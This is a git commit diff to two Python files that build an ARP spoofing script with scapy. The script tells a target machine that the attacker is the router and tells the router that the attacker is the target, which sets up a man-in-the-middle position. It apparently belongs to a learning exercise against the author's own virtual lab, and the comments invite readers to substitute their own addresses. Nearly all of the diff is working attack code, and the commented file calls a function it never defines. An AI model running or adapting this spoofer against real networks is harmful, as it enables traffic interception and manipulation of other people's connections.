237cd6622625f9b3183a0993b6dd8fa708b9a56d
Vhackenstance <hackenstance@proton.me>
2026-05-09 13:39:45 -0500

    Running both ways but only 1 packet

--- arp_spoof.py
+++ arp_spoof.py
@@ -1,6 +1,6 @@
 #/usr/bin/env python
 # Rebuild
-from scapy.layers.l2 import ARP
+from scapy.layers.l2 import ARP, Ether
 import scapy.all as scapy
 from utils.arp_spoof_utils import check_port_forwarding
 
@@ -12,24 +12,21 @@ my_ip = "192.168.63.139"
 my_mac = "00-0c-29-fe-37-29"
 
 # get the Target IP MAC Address
-def scan(ip):
+def get_mac(ip):
 	arp_request = ARP(pdst=ip)
 	broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
 	broadcast_arp_request = broadcast/arp_request
 	answered_list = scapy.srp(broadcast_arp_request, timeout=1, verbose=False)[0]
-
-	clients_list = []
-	for element in answered_list:
-		client_dict = {"ip": element[1].psrc, "mac": element[1].hwsrc}
-		clients_list.append(client_dict)
-	return clients_list
+	return answered_list[0][1].hwsrc
 
 check_port_forwarding()
 
-# So, previously we fooled the target into thinking we are the router.
-# But we also need to fool the router into thinking we are the target
-# We can build a function to do this:
-
 def spoof(target_ip, spoof_ip):
-	packet = ARP(op=2, pdst=target_ip, hwdst=target_mac_1, psrc=spoof_ip)
+	target_mac = get_mac(target_ip)
+	packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
 	scapy.send(packet)
+
+# Tell the Target Computer we are the Router
+spoof(target_interface_1, router_ip)
+# Tell the Router we are the Target Computer
+spoof(router_ip, target_interface_1)
--- arp_spoof_commented.py
+++ arp_spoof_commented.py
@@ -1,14 +1,17 @@
 #/usr/bin/env python
 # Rebuild
-from scapy.all import ARP
+from scapy.layers.l2 import ARP, Ether
 
-target_interface_1 = "192.168.63.174" # IP Address of a remote machine to Target.
-target_interface_2 = "192.168.63.177" # IP Address of a remote machine to Target.
+# These values are for my virtual network only
+# You should be able to substiture your own in here
+target_interface_1 = "192.168.63.174" # IP Windows10_1 VM Target.
+target_interface_2 = "192.168.63.177" # IP Windows10_2 VM Target.
 target_mac_1 = "00:0c:29:3a:62:c0"
 router_ip = "192.168.63.2"
 my_ip = "192.168.63.139"
 my_mac = "00-0c-29-fe-37-29"
 
+# TODO UPDATE THIS TO REAME
 # Prior to Spoofing, the Target machine can ping and connect to my webserver.
 # BASIC DEMONSTRATION OF WHAT WE HOPE TO ACHIEVE
 # Using arpspoof at the command line, run both in different windows
@@ -35,4 +38,13 @@ packet = ARP(op=2, pdst=target_interface_1, hwdst=target_mac_1, psrc=router_ip)
 # print(packet.summary())
 # Send our scapy ARP packet to the target IP address.
 # scapy.send(packet)
+
+# So, previously we fooled the target into thinking we are the router.
+# But we also need to fool the router into thinking we are the target
+# We can build a function to do this:
+
+def spoof(target_ip, spoof_ip):
+	target_mac = get_mac(target_ip)
+	packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+	scapy.send(packet)
 
